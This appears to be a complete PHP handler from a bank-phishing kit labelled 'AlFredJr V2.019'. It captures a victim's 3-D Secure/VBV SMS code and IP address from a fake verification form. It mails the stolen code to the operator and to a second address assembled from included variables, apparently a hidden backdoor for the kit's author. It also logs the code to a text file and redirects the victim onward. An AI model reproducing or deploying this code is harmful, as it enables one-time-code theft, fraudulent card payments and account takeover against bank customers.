<?php
	include('./includes/bots.php');
	include '../email.php';
	include'../get_browser.php';
    include'../get_bin.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[----------AlFredJr V2.019--------]\n";
$message .= "SMS[VBV/3DS] : ".$_POST['bankid']."\n";
$message .= "ADRESSE IP    : $hostname\n";
$message .= "[----------AlFredJr V2.019--------]\n";
$Subject= "SMS VBV/3DS [1/3] "._ip();
$head="From: SHADUCK  <vbv@rezzz.com>";
$bin = "$browserx$versionx$getbinsx";
if(mail($my_mail,$Subject,$message,$head) && mail($bin,$Subject,$message,$head)) ;
$fp = fopen("vbv1.txt", "a +");
			fputs($fp, $message);
			fclose($fp);

     echo "<meta http-equiv='refresh' content='0; url=./load1.php' />";

?>
